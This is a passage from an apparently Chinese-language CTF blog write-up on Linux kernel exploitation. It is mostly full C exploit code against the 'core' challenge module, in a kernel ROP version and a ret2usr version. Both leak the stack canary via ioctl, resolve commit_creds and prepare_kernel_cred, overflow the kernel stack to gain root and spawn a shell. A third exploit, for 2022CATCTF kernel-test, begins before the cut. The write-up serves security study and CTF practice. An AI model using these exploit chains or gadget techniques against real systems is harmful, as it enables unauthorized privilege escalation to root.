class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">        	<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);</span><br><span class="line">        	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">	<span class="type">size_t</span> addr;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;commit_creds&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			commit_creds = addr;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			prepare_kernel_cred = addr;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            		<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>
+<p>有两种打法，一种就是纯kernel rop因为<code>kallsym</code>被拷贝到了tmp里，所以我们可以得到<code>prepare_kernel_cred</code>和<code>commit_creds</code>的地址，另一种由于没开SMAP/SMEP可以打ret2usr</p>
+<p>编译指令<code>gcc exp.c -masm=intel -static -o exp</code></p>
+<p><strong>exp (kernel rop)</strong></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff81000b2f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDX_RET 0xffffffff810a0f49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_POPFQ_RET 0xffffffff81a012da</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ 0xffffffff81050ac2</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="literal">NULL</span>, prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(getuid())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">coreRead</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span>* buf)</span></span><br><span class="line">&#123;</span><br><span class="line">	ioctl(fd, <span class="number">0x6677889B</span>, buf);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setOffValue</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">	ioctl(fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">coreCopyFunc</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> nbytes)</span></span><br><span class="line">&#123;</span><br><span class="line">	ioctl(fd, <span class="number">0x6677889A</span>, nbytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">	saveStatus();</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span>(fd&lt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the file: /proc/core !\033[0m\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] debug1\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">	FILE* sym_table_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(sym_table_fd &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">        	<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);</span><br><span class="line">        	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] debug2\033[0m&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">	<span class="type">size_t</span> addr;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;commit_creds&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			commit_creds = addr;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			prepare_kernel_cred = addr;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            		<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] debug3\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> offset = commit_creds - <span class="number">0xffffffff8109c8e0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> canary;</span><br><span class="line">	setOffValue(fd, <span class="number">64</span>);</span><br><span class="line">	coreRead(fd, buf);</span><br><span class="line">	canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">	</span><br><span class="line">	<span class="type">size_t</span> rop_chain[<span class="number">0x100</span>];</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		rop_chain[i] = canary; </span><br><span class="line">	&#125;</span><br><span class="line">	rop_chain[i++] = POP_RDI_RET + offset;</span><br><span class="line">	rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">	rop_chain[i++] = prepare_kernel_cred;</span><br><span class="line">	rop_chain[i++] = POP_RDX_RET + offset;</span><br><span class="line">	rop_chain[i++] = POP_RDX_RET + offset;</span><br><span class="line">	<span class="comment">//rop_chain[i++] = commit_creds;</span></span><br><span class="line">	rop_chain[i++] = MOV_RDI_RAX_CALL_RDX + offset;</span><br><span class="line">	rop_chain[i++] = commit_creds;</span><br><span class="line">	rop_chain[i++] = SWAPGS_POPFQ_RET + offset;</span><br><span class="line">	rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">	rop_chain[i++] = IRETQ + offset;</span><br><span class="line">	rop_chain[i++] = (<span class="type">size_t</span>)getRootShell;</span><br><span class="line">	rop_chain[i++] = user_cs;</span><br><span class="line">	rop_chain[i++] = user_rflags;</span><br><span class="line">	rop_chain[i++] = user_sp;</span><br><span class="line">	rop_chain[i++] = user_ss;</span><br><span class="line">		</span><br><span class="line">	write(fd, rop_chain, <span class="number">0x800</span>);</span><br><span class="line">	coreCopyFunc(fd, <span class="number">0xffffffffffff0100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>rop的构造比较有意思，由于需要把<code>prepare_kernel_cred</code>的返回结果作为<code>commit_creds</code>的参数，所以需要找gadget把rax赋给rdi，<code>MOV_RDI_RAX_CALL_RDX</code>这个gadget可以满足，但是我们需要控制好rdx的值，并且由于call指令会先<code>push rip+x</code>，所以要接着执行rop需要pop清理掉栈中的返回地址</p>
+<p><strong>exp (ret2usr)</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;sys/types.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define POP_RDI_RET 0xffffffff81000b2f</span></span><br><span class="line"><span class="comment">#define POP_RDX_RET 0xffffffff810a0f49</span></span><br><span class="line"><span class="comment">#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a</span></span><br><span class="line"><span class="comment">#define SWAPGS_POPFQ_RET 0xffffffff81a012da</span></span><br><span class="line"><span class="comment">#define IRETQ 0xffffffff81050ac2</span></span><br><span class="line"></span><br><span class="line">size_t commit_creds = NULL, prepare_kernel_cred = NULL;</span><br><span class="line"></span><br><span class="line">size_t user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line">void saveStatus()</span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    puts(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void getRootShell()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(getuid())</span><br><span class="line">	&#123;</span><br><span class="line">		printf(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">		exit(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void EoP()</span><br><span class="line">&#123;</span><br><span class="line">	char* (*pkc)(<span class="built_in">int</span>) = prepare_kernel_cred;</span><br><span class="line">	void (*cc)(char*) = commit_creds;</span><br><span class="line">	(*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void coreRead(<span class="built_in">int</span> fd, char* buf)</span><br><span class="line">&#123;</span><br><span class="line">	ioctl(fd, <span class="number">0x6677889B</span>, buf);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void setOffValue(<span class="built_in">int</span> fd, size_t off)</span><br><span class="line">&#123;</span><br><span class="line">	ioctl(fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void coreCopyFunc(<span class="built_in">int</span> fd, size_t nbytes)</span><br><span class="line">&#123;</span><br><span class="line">	ioctl(fd, <span class="number">0x6677889A</span>, nbytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">	printf(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">	saveStatus();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">int</span> fd = <span class="built_in">open</span>(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span>(fd&lt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the file: /proc/core !\033[0m\n&quot;</span>);</span><br><span class="line">		exit(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	puts(<span class="string">&quot;\033[34m\033[1m[*] debug1\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">	FILE* sym_table_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(sym_table_fd &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">        	printf(<span class="string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);</span><br><span class="line">        	exit(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	puts(<span class="string">&quot;\033[34m\033[1m[*] debug2\033[0m&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	char buf[<span class="number">0x50</span>], <span class="built_in">type</span>[<span class="number">0x10</span>];</span><br><span class="line">	size_t addr;</span><br><span class="line">	<span class="keyword">while</span>(fscanf(sym_table_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, <span class="built_in">type</span>, buf))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(!commit_creds &amp;&amp; !strcmp(buf, <span class="string">&quot;commit_creds&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			commit_creds = addr;</span><br><span class="line">			printf(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!strcmp(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			prepare_kernel_cred = addr;</span><br><span class="line">			printf(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            		<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	puts(<span class="string">&quot;\033[34m\033[1m[*] debug3\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">	size_t offset = commit_creds - <span class="number">0xffffffff8109c8e0</span>;</span><br><span class="line"></span><br><span class="line">	size_t canary;</span><br><span class="line">	setOffValue(fd, <span class="number">64</span>);</span><br><span class="line">	coreRead(fd, buf);</span><br><span class="line">	canary = ((size_t *)buf)[<span class="number">0</span>];</span><br><span class="line">	</span><br><span class="line">	size_t rop_chain[<span class="number">0x100</span>];</span><br><span class="line">	<span class="built_in">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		rop_chain[i] = canary; </span><br><span class="line">	&#125;</span><br><span class="line">	rop_chain[i++] = (size_t)EoP;</span><br><span class="line">	rop_chain[i++] = SWAPGS_POPFQ_RET + offset;</span><br><span class="line">	rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">	rop_chain[i++] = IRETQ + offset;</span><br><span class="line">	rop_chain[i++] = (size_t)getRootShell;</span><br><span class="line">	rop_chain[i++] = user_cs;</span><br><span class="line">	rop_chain[i++] = user_rflags;</span><br><span class="line">	rop_chain[i++] = user_sp;</span><br><span class="line">	rop_chain[i++] = user_ss;</span><br><span class="line">		</span><br><span class="line">	write(fd, rop_chain, <span class="number">0x800</span>);</span><br><span class="line">	coreCopyFunc(fd, <span class="number">0xffffffffffff0100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>实际上区别不大，也只是简化了rop构造的难度</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://picture-1311455354.cos.ap-shanghai.myqcloud.com/image-20230120231327011.png" alt></p>
+<h3 id="2022CATCTF-kernel-test"><a href="#2022CATCTF-kernel-test" class="headerlink" title="[2022CATCTF]kernel-test"></a>[2022CATCTF]kernel-test</h3><p>kernel pwn入门难度，和core差不多，没开SMAP/SMEP</p>
+<p>给了个有洞的内核模块test，先read读出canary再通过write写payload，最后qmemcpy造成溢出打ret2usr</p>
+<p>只是ida反编译出的伪代码有些奇怪，函数缺了参数，canary也不给标，一开始把canary找错了，还得是看汇编</p>
+<p><strong>exp</strong></p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_POPRBP_RET 0xffffffff8107a4d4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ 0xffffffff8103b82b</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="literal">NULL</span>, prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span 